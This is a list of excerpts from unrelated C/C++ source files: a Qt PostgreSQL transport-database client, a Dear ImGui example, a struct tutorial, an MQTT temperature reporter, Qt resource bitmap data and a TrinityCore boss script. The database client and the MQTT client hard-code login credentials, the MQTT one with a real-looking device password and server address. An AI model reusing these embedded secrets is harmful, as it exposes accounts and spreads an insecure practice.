    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n\r\nMainWindow::MainWindow(QWidget *parent) : // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n    QMainWindow(parent),\r\n    ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    setWindowTitle(\"Semenov_db\");\r\n    if (ConnectToDB())createEnterButtons();\r\n    else {\r\n        QPushButton* tryAgain = GetNewButton(\"\u041f\u043e\u043f\u0440\u043e\u0431\u043e\u0432\u0430\u0442\u044c \u0441\u043d\u043e\u0432\u0430\",true,\"-\",\"-\");\r\n        tryAgain->setParent(this);\r\n        tryAgain->setGeometry(10,10,200,50);\r\n        tryAgain->show();\r\n        connect(tryAgain,SIGNAL(clicked()),this,SLOT(tryAgainToConnect()));\r\n    }\r\n}\r\n\r\nMainWindow::~MainWindow() // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n{\r\n    if (db!=nullptr)\r\n    {        \r\n        delete db;\r\n    }\r\n    ExitEnter(false);\r\n    delete ui;\r\n}\r\n\r\nbool MainWindow::ConnectToDB() // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u043a \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445\r\n{\r\n    db = new QSqlDatabase(QSqlDatabase::addDatabase(\"QPSQL\",\"newConnection\"));\r\n    db->setDatabaseName(\"Public_Transport_DB\");\r\n    db->setHostName(\"127.0.0.1\");\r\n    db->setPort(5432);\r\n    if (!db->open(\"postgres\",\"changeme\"))\r\n    {\r\n        QMessageBox::warning(this,\"Error\", db->lastError().text());\r\n        db->removeDatabase(\"newConnection\");\r\n        delete db;\r\n        db = nullptr;\r\n        return false;\r\n    }\r\n    return true;\r\n}\r\n\r\nvoid MainWindow::tryAgainToConnect() // \u041f\u043e\u043f\u0440\u043e\u0431\u043e\u0432\u0430\u0442\u044c \u043f\u043e\u043a\u0434\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u0441\u043d\u043e\u0432\u0430\r\n{\r\n    if (ConnectToDB())ExitEnter(true);\r\n}\r\n\r\nQTableWidgetItem *MainWindow::GetNewItem(QString name, bool isEditable, bool isHeader) // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043d\u043e\u0432\u043e\u0439 \u044f\u0447\u0435\u0439\u043a\u0438 \u0432 \u0442\u0430\u0431\u043b\u0438\u0446\u0435\r\n{\r\n    QTableWidgetItem* temp = new QTableWidgetItem(name);\r\n    temp->setTextAlignment(Qt::AlignCenter);\r\n    if (!isEditable) temp->setFlags(temp->flags() ^ Qt::ItemIsEditable);\r\n    if (isHeader)\r\n    {\r\n        QFont font = temp->font();\r\n        font.setBold(true);\r\n        temp->setFont(font);\r\n    }\r\n    return temp;\r\n}\r\n\r\nQPushButton *MainWindow::GetNewButton(QString name, bool isOn, QString propertyName, QString propertyValue) // \u0424\u0443\u043d\u043a\u0438\u0446\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043d\u043e\u0432\u043e\u0439 \u043a\u043d\u043e\u043f\u043a\u0438\r\n{\r\n    QPushButton* temp = new QPushButton();\r\n    temp->setText(name);\r\n    if (!isOn) temp->setEnabled(false);\r\n    temp->setProperty(propertyName.toLocal8Bit().data(),propertyValue);\r\n    return temp;\r\n}\r\n\r\nvoid MainWindow::FillTable(QTableWidget *tableToFill, QString query) // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b\r\n{\r\n    qw = db->exec(query);\r\n    tableToFill->clear();\r\n    tableToFill->setRowCount(qw.size()+1);\r\n    tableToFill->setColumnCount(qw.record().count());\r\n    tableToFill->verticalHeader()->hide();\r\n    tableToFill->horizontalHeader()->hide();\r\n    for (int i = 0; i < qw.record().count(); i++)\r\n    {\r\n        tableToFill->setItem(0,i,GetNewItem(qw.record().fieldName(i),false, true));\r\n        for (int j = 0; j < qw.size(); j++)\r\n        {\r\n            qw.seek(j);\r\n            tableToFill->setItem(j+1,i,GetNewItem(qw.value(i).toString(),false));\r\n        }\r\n    }\r\n}\r\n\r\nvoid MainWindow::FillTableButton(QTableWidget *tableToFill, QString query, QString header, QString text, int propertyColumn, QString propertyName) // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b + \u043a\u043d\u043e\u043f\u043a\u0430\r\n{\r\n    qw = db->exec(query);\r\n    tableToFill->clear();\r\n    tableToFill->setRowCount(qw.size()+1);\r\n    tableToFill->setColumnCount(qw.record().count()+1);\r\n    tableToFill->verticalHeader()->hide();\r\n    tableToFill->horizontalHeader()->hide();\r\n    for (int i = 0; i < qw.record().count(); i++)\r\n    {\r\n        tableToFill->setItem(0,i,GetNewItem(qw.record().fieldName(i),false, true));\r\n        for (int j = 0; j < qw.size(); j++)\r\n        {\r\n            qw.seek(j);\r\n            tableToFill->setItem(j+1,i,GetNewItem(qw.value(i).toString(),false));\r\n\r\n        }\r\n    }    for (int j = 0; j < qw.size(); j++)\r\n    {\r\n        qw.seek(j);\r\n        QPushButton* temp = GetNewButton(text, true, propertyName, qw.value(propertyColumn).toString());\r\n        connect(temp, SIGNAL(clicked()), this, SLOT(GuestShowRouteInfo()));\r\n        tableToFill->setCellWidget(j+1, tableToFill->columnCount()-1, temp);\r\n    }\r\n    tableToFill->setItem(0, tableToFill->columnCount()-1, GetNewItem(header,false,true));\r\n}\r\n\r\nvoid MainWindow::GuestEnter() // \u041a\u043d\u043e\u043f\u043a\u0430 \u0434\u043b\u044f \u0432\u0445\u043e\u0434\u044f \u0433\u043e\u0441\u0442\u044f\r\n{\r\n    pbEnterAdmin->hide();\r\n    pbEnterGuest->hide();\r\n    createExitButton();\r\n\r\n    table_info = new QTableWidget(this);\r\n    table_info->setGeometry(0,500,849,150);\r\n\r\n    QTableWidget* table_routes = new QTableWidget(this);\r\n    table_routes->setGeometry(849,-1,202,this->height());\r\n\r\n    QString query_routes = \"SELECT name as \\\"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\\\" FROM \\\"Routes\\\"\";\r\n    FillTableButton(table_routes,query_routes, \"\u0414\u0435\u0439\u0441\u0442\u0432\u0438\u0435\", \"\u0412\u044b\u0431\u0440\u0430\u0442\u044c\", 0, \"name\");\r\n    table_routes->show();\r\n    table_routes->resizeRowsToContents();\r\n    qw = db->exec(\"select * from \\\"Stops\\\" order by \\\"id_stop\\\" \");\r\n    for (int i = 0; i < qw.size(); i++)\r\n    {\r\n        qw.seek(i);\r\n        QStringList coords = qw.value(\"location\").toString().split(\"{\")[1].split(\"}\")[0].split(\",\");\r\n        guestStops.append(GetNewButton(\"+\",true,\"ID\",qw.value(\"id_stop\").toString()));\r\n        guestStops[i]->setParent(thi",
    "// Dear ImGui: standalone example application for SDL2 + OpenGL\n// (SDL is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n#include <windows.h>\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl3.h\"\n#include <stdio.h>\n#define SDL_MAIN_HANDLED\n#include <SDL.h>\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n#include <SDL_opengles2.h>\n#else\n#include <SDL_opengl.h>\n#endif\n\n// This example can also compile and run with Emscripten! See 'Makefile.emscripten' for details.\n#ifdef __EMSCRIPTEN__\n#include \"../libs/emscripten/emscripten_mainloop_stub.h\"\n#endif\n\n// Main code\nint main(int argc, char *argv[])\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0)\n    {\n        printf(\"Error: %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // Decide GL+GLSL versions\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n    // GL ES 2.0 + GLSL 100\n    const char* glsl_version = \"#version 100\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, 0);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_ES);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 2);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 0);\n#elif defined(__APPLE__)\n    // GL 3.2 Core + GLSL 150\n    const char* glsl_version = \"#version 150\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, SDL_GL_CONTEXT_FORWARD_COMPATIBLE_FLAG); // Always required on Mac\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_CORE);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 3);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 2);\n#else\n    // GL 3.0 + GLSL 130\n    const char* glsl_version = \"#version 130\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, 0);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_CORE);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 3);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 0);\n#endif\n\n    // From 2.0.18: Enable native IME.\n#ifdef SDL_HINT_IME_SHOW_UI\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n#endif\n\n    // Create window with graphics context\n    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n    SDL_WindowFlags window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);\n    SDL_Window* window = SDL_CreateWindow(\"Dear ImGui SDL2+OpenGL3 example\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);\n    if (window == nullptr)\n    {\n        printf(\"Error: SDL_CreateWindow(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    SDL_GLContext gl_context = SDL_GL_CreateContext(window);\n    SDL_GL_MakeCurrent(window, gl_context);\n    SDL_GL_SetSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);\n    ImGui_ImplOpenGL3_Init(glsl_version);\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    // - Our Emscripten build process allows embedding fonts to be accessible at runtime from the \"fonts/\" folder. See Makefile.emscripten for details.\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/font",
    "\r\n//************************Structure in C++****************************\r\n/*\r\n    struct short for structure, is an user-define data types avaliable in C++.\r\n    it allows a user to combine data items of differents data types under a single name.\r\n    \r\n    syntax: \r\n    typedef struct struct_name{\r\n        data_type member_name1;\r\n        data_type member_name2;\r\n        data_type member_name3;\r\n    };\r\n\r\n*/\r\n\r\n#include<iostream>\r\nusing namespace std;\r\n\r\nstruct student {\r\n    int roll_number;\r\n    float marks;\r\n    char grade;\r\n};\r\n\r\nint main() {\r\n   \r\n    student S1;\r\n    S1.roll_number = 10;\r\n    S1.marks = 86.5;\r\n    S1.grade = 'A';\r\n\r\n    student S2;\r\n    S2.roll_number = 20;\r\n    S2.marks =65.8;\r\n    S2.grade = 'B';\r\n\r\n    cout << \"Student 1 Details: \" << endl;\r\n    cout << \"Roll Number: \" << S1.roll_number << endl;\r\n    cout << \"Marks: \" << S1.marks << endl;\r\n    cout << \"Grade: \" << S1.grade << endl;\r\n    \r\n    cout << \"\\nStudent 2 Details: \" << endl;\r\n    cout << \"Roll Number: \" << S2.roll_number << endl;\r\n    cout << \"Marks: \" << S2.marks << endl;\r\n    cout << \"Grade: \" << S2.grade << endl;\r\n\r\n//********************** Typedef in structure**********************\r\n/*\r\n    The typedef in c++ is used to define a structure and create an alias for it. \r\n    This allows us to use the alias instead of the struct keyword when defineing variables of the structure.\r\n    Syntax:\r\n    typedef struct struct_name{\r\n        data_type member_name1;\r\n        data_type member_name2;\r\n        data_type member_name3;\r\n    }alias_name;\r\n*/\r\n    \r\n    typedef struct employee{\r\n        int id;\r\n        char latter;\r\n        float salary;\r\n    } emp; //alias of employee\r\n    \r\n    emp e1;\r\n    e1.id = 101;\r\n    e1.latter= 'A';\r\n    e1.salary = 50000.00;\r\n\r\n    cout << \"\\nEmployee 1 Details: \" << endl;\r\n    cout << \"ID: \" << e1.id << endl;\r\n    cout << \"Latter: \" << e1.latter << endl;\r\n    cout << \"Salary: \" << e1.salary << endl;\r\n\r\n    return 0;\r\n\r\n}",
    "#include \"mqtt.h\"\r\n#include <iostream>\r\n#include <cstring>\r\n#include <unistd.h>\r\n// \u8bbe\u7f6e\u670d\u52a1\u5668\u7684\u5730\u5740\u548c\u7aef\u53e3\r\n#define SERVER_IP \"117.78.5.125\"\r\n#define SERVER_PORT 1883\r\n// MQTT\u9274\u6743\u4e09\u5143\u7ec4(\u6b64\u5904\u9700\u8981\u6839\u636e\u60c5\u51b5\u4fee\u6539\uff0c\u76f4\u63a5\u8fd0\u884c\u4e0d\u4f1a\u6210\u529f)\r\n#define ClientID \"667c3a7d671df42eb372386_dev1_0_0_2024091800\"\r\n#define Username \"667c3a7d671df42eb372386_dev1\"\r\n#define Password \"e9c621f8212c344cac5ed6b72599593c6dc832576c82e1d1c0d3b780c15e21e5\"\r\n\r\n#define SET_TOPIC \"$oc/devices/667c3a7d671df42eb372386_dev1/sys/messages/down\"\t\t// \u4e3b\u9898\u8ba2\u9605\r\n#define POST_TOPIC \"$oc/devices/667c3a7d671df42eb372386_dev1/sys/properties/report\" // \u4e3b\u9898\u53d1\u5e03\r\n\r\nextern int connectSocket; // \u5b58\u50a8\u5957\u63a5\u5b57\u63cf\u8ff0\u7b26\r\ndouble DHT11_T = 10.0;\t  // \u73af\u5883\u6e29\u5ea6\r\n\r\nint main()\r\n{\r\n\t// \u521b\u5efaTCP\u5957\u63a5\u5b57\uff0c\u5e76\u68c0\u67e5\u662f\u5426\u521b\u5efa\u6210\u529f\r\n\tconnectSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n\tif (connectSocket < 0)\r\n\t{\r\n\t\tperror(\"socket creation failed\");\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tstruct sockaddr_in service;\r\n\tmemset(&service, 0, sizeof(service));\r\n\tservice.sin_family = AF_INET;\r\n\tinet_pton(AF_INET, SERVER_IP, &service.sin_addr);\r\n\tservice.sin_port = htons(SERVER_PORT);\r\n\r\n\t// \u8bbe\u7f6e\u670d\u52a1\u5668\u7684\u5730\u5740\u548c\u7aef\u53e3,\u5c1d\u8bd5\u8fde\u63a5\u5230\u670d\u52a1\u5668\r\n\tif (connect(connectSocket, (struct sockaddr *)&service, sizeof(service)) < 0)\r\n\t{\r\n\t\tperror(\"connect failed\");\r\n\t\tclose(connectSocket);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tstd::cout << \"connected to server\" << std::endl;\r\n\tMQTT_Init();\r\n\twhile (1)\r\n\t{\r\n\t\t// \u5c1d\u8bd5\u8fde\u63a5\u5230MQTT\u670d\u52a1\u5668\uff0c\u5982\u679c\u8fde\u63a5\u5931\u8d25\uff0c\u5219\u7b49\u5f851\u79d2\u540e\u91cd\u8bd5\u3002\r\n\t\tif (MQTT_Connect((char *)ClientID, (char *)Username, (char *)Password) == 0)\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tsleep(1);\r\n\t\tstd::cout << \"MQTT\u670d\u52a1\u5668\u767b\u5f55\u6821\u9a8c\u4e2d....\\n\";\r\n\t}\r\n\r\n\tstd::cout << \"\u8fde\u63a5\u6210\u529f\\n\";\r\n\r\n\t// \u8ba2\u9605\u4e3b\u9898\r\n\tint stat = MQTT_SubscribeTopic((char *)SET_TOPIC, 1, 1);\r\n\tif (stat)\r\n\t{\r\n\t\tstd::cout << \"\u8ba2\u9605\u5931\u8d25\\n\";\r\n\t\tclose(connectSocket);\r\n\t\treturn 1;\r\n\t}\r\n\tstd::cout << \"\u8ba2\u9605\u6210\u529f\\n\";\r\n\r\n\twhile (1)\r\n\t{\r\n\t\t// \u6bcf\u96945\u79d2\u53d1\u5e03\u4e00\u6b21\u6d88\u606f\uff0c\u5e76\u66f4\u65b0\u6e29\u5ea6\u503c\r\n\t\tstd::cout << \"start send message\" << std::endl;\r\n\t\tchar mqtt_message[1024];\r\n\t\t// \u6784\u9020\u4e00\u4e2a\u5305\u542b\u6e29\u5ea6\u6570\u636e\u7684JSON\u6d88\u606f\uff0c\u5e76\u53d1\u5e03\u5230\u6307\u5b9a\u7684\u4e3b\u9898\r\n\t\tsprintf(mqtt_message, \"{\\\"services\\\": [{\\\"service_id\\\": \\\"stm32\\\",\\\"properties\\\":{\\\"DHT11_T\\\":%.1f}}]}\", DHT11_T += 0.2);\r\n\r\n\t\tMQTT_PublishData((char *)POST_TOPIC, mqtt_message, 0);\r\n\t\tstd::cout << \"\u53d1\u5e03\u6d88\u606f\u6210\u529f\" << std::endl;\r\n\t\tsleep(5);\r\n\t}\r\n\r\n\tclose(connectSocket);\r\n\treturn 0;\r\n}",
    "/****************************************************************************\n** Resource object code\n**\n** Created by: The Resource Compiler for Qt version 6.7.2\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\nstatic const unsigned char qt_resource_data[] = {\n  // D:/Qt_work/samp2_4App/images/WORDUNDR.BMP\n  0x0,0x0,0x0,0xf6,\n  0x42,\n  0x4d,0xf6,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x76,0x0,0x0,0x0,0x28,0x0,0x0,\n  0x0,0x10,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x1,0x0,0x4,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x80,0x0,0x0,0x80,0x0,\n  0x0,0x0,0x80,0x80,0x0,0x80,0x0,0x0,0x0,0x80,0x0,0x80,0x0,0x80,0x80,0x0,\n  0x0,0x80,0x80,0x80,0x0,0xc0,0xc0,0xc0,0x0,0x0,0x0,0xff,0x0,0x0,0xff,0x0,\n  0x0,0x0,0xff,0xff,0x0,0xff,0x0,0x0,0x0,0xff,0x0,0xff,0x0,0xff,0xff,0x0,\n  0x0,0xff,0xff,0xff,0x0,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x0,0x8,\n  0x0,0x8,0x0,0x8,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x0,\n  0x88,0x80,0x8,0x88,0x88,0x88,0x88,0x0,0x8,0x0,0x8,0x88,0x88,0x88,0x80,0x0,\n  0x8,0x0,0x0,0x88,0x88,0x88,0x80,0x8,0x0,0x8,0x0,0x88,0x88,0x88,0x80,0x8,\n  0x0,0x8,0x0,0x88,0x88,0x88,0x0,0x88,0x80,0x88,0x80,0x8,0x88,0x88,0x0,0x88,\n  0x88,0x88,0x80,0x8,0x88,0x88,0x0,0x88,0x88,0x88,0x80,0x8,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,\n    // D:/Qt_work/samp2_4App/images/new2.bmp\n  0x0,0x0,0x0,0x53,\n  0x0,\n  0x0,0x4,0x36,0x78,0xda,0x73,0xf2,0x35,0x63,0x61,0x0,0x3,0x33,0x20,0xd6,0x0,\n  0x62,0x1,0x28,0x66,0x64,0x50,0x80,0x48,0x40,0xe5,0x91,0xc1,0xff,0xff,0xff,0xa9,\n  0x82,0x67,0xce,0x9c,0x49,0x12,0xc6,0xa6,0x9f,0x14,0xbb,0x70,0x89,0x9d,0x39,0x73,\n  0x6,0x2f,0x26,0xa4,0x7f,0xd4,0xfe,0xe1,0x67,0x3f,0xb6,0xf4,0x49,0xaa,0xfd,0x30,\n  0x79,0x5c,0xea,0x88,0xd1,0x8f,0x4f,0xd,0x39,0x79,0x86,0x1a,0x18,0x0,0xd5,0xd6,\n  0xac,0xaa,\n    // D:/Qt_work/samp2_4App/images/ITL.BMP\n  0x0,0x0,0x0,0xf6,\n  0x42,\n  0x4d,0xf6,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x76,0x0,0x0,0x0,0x28,0x0,0x0,\n  0x0,0x10,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x1,0x0,0x4,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x80,0x0,0x0,0x80,0x0,\n  0x0,0x0,0x80,0x80,0x0,0x80,0x0,0x0,0x0,0x80,0x0,0x80,0x0,0x80,0x80,0x0,\n  0x0,0x80,0x80,0x80,0x0,0xc0,0xc0,0xc0,0x0,0x0,0x0,0xff,0x0,0x0,0xff,0x0,\n  0x0,0x0,0xff,0xff,0x0,0xff,0x0,0x0,0x0,0xff,0x0,0xff,0x0,0xff,0xff,0x0,\n  0x0,0xff,0xff,0xff,0x0,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x80,0x0,0x0,0x8,0x88,0x88,0x88,0x88,0x88,0x80,\n  0x7,0x88,0x88,0x88,0x88,0x88,0x88,0x87,0x0,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x0,0x78,0x88,0x88,0x88,0x88,0x88,0x88,0x70,0x8,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x80,0x7,0x88,0x88,0x88,0x88,0x88,0x88,0x87,0x0,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x0,0x78,0x88,0x88,0x88,0x88,0x88,0x80,0x0,0x0,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,\n    // D:/Qt_work/samp2_4App/images/open3.bmp\n  0x0,0x0,0x0,0x96,\n  0x0,\n  0x0,0x4,0x36,0x78,0xda,0xdd,0x92,0xc1,0x9,0x80,0x30,0xc,0x45,0x2b,0x38,0x80,\n  0x23,0x78,0xf4,0x2e,0x74,0x0,0xef,0xae,0xd1,0x9d,0xb2,0x53,0x76,0xaa,0xf9,0xda,\n  0x40,0xa8,0xb5,0x2d,0x5e,0x4,0xb,0xf,0x3,0xf9,0x3f,0xf9,0x56,0xb7,0xdd,0x8f,\n  0xee,0x3c,0x5e,0x58,0x84,0x29,0x31,0xb8,0xf9,0x6a,0xa4,0xbe,0x3d,0x31,0xc6,0xcf,\n  0x59,0x89,0x9d,0xb,0xd4,0x45,0x60,0xbe,0x79,0x1,0x49,0x1d,0xb8,0x8e,0xee,0x29,\n  0xf9,0xd1,0xc7,0x8c,0x1a,0xd0,0xc0,0xf,0xfd,0x5b,0x3f,0xf2,0xdb,0xc,0xea,0xd5,\n  0x77,0x68,0xf9,0xf1,0xb4,0x19,0xd4,0x8f,0xb9,0xa0,0xc7,0x6f,0x33,0xd8,0xbb,0x43,\n  0xcd,0x52,0x3f,0x41,0xa6,0xce,0xfd,0x76,0x46,0xf,0xd0,0xaa,0x9f,0xb,0x59,0x4b,\n  0xfb,0xf3,0x6f,0x67,0xef,0x30,0xd7,0x96,0x76,0xb6,0xfe,0xc1,0x5e,0xed,0x9f,0x38,\n  0x0,0x46,0xd3,0x80,0x70,\n    // D:/Qt_work/samp2_4App/images/BLD.BMP\n  0x0,0x0,0x0,0xf6,\n  0x42,\n  0x4d,0xf6,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x76,0x0,0x0,0x0,0x28,0x0,0x0,\n  0x0,0x10,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x1,0x0,0x4,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x80,0x0,0x0,0x80,0x0,\n  0x0,0x0,0x80,0x80,0x0,0x80,0x0,0x0,0x0,0x80,0x0,0x80,0x0,0x80,0x80,0x0,\n  0x0,0x80,0x80,0x80,0x0,0xc0,0xc0,0xc0,0x0,0x0,0x0,0xff,0x0,0x0,0xff,0x0,\n  0x0,0x0,0xff,0xff,0x0,0xff,0x0,0x0,0x0,0xff,0x0,0xff,0x0,0xff,0xff,0x0,\n  0x0,0xff,0xff,0xff,0x0,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88,\n  0x88,0x88,0x88,0x88,0x88,0x88,0x80,0x0,0x0,0x0,0x8,0x88,0x88,0x88,0x88,0x0,\n  0x8,0x80,0x0,0x88,0x88,0x88",
    "/*\n * Copyright (C) 2008-2012 TrinityCore <http://www.trinitycore.org/>\n * Copyright (C) 2006-2009 ScriptDev2 <https://scriptdev2.svn.sourceforge.net/>\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n/* ScriptData\nSDName: Boss_Sulfuron_Harbringer\nSD%Complete: 80\nSDComment: Adds NYI\nSDCategory: Molten Core\nEndScriptData */\n\n#include \"ObjectMgr.h\"\n#include \"ScriptMgr.h\"\n#include \"ScriptedCreature.h\"\n#include \"molten_core.h\"\n\nenum Spells\n{\n    // Sulfuron Harbringer\n    SPELL_DARK_STRIKE           = 19777,\n    SPELL_DEMORALIZING_SHOUT    = 19778,\n    SPELL_INSPIRE               = 19779,\n    SPELL_KNOCKDOWN             = 19780,\n    SPELL_FLAMESPEAR            = 19781,\n\n    // Adds\n    SPELL_HEAL                  = 19775,\n    SPELL_SHADOWWORDPAIN        = 19776,\n    SPELL_IMMOLATE              = 20294,\n};\n\nenum Events\n{\n    EVENT_DARK_STRIKE           = 1,\n    EVENT_DEMORALIZING_SHOUT    = 2,\n    EVENT_INSPIRE               = 3,\n    EVENT_KNOCKDOWN             = 4,\n    EVENT_FLAMESPEAR            = 5,\n\n    EVENT_HEAL                  = 6,\n    EVENT_SHADOW_WORD_PAIN      = 7,\n    EVENT_IMMOLATE              = 8,\n};\n\nclass boss_sulfuron : public CreatureScript\n{\n    public:\n        boss_sulfuron() : CreatureScript(\"boss_sulfuron\") { }\n\n        struct 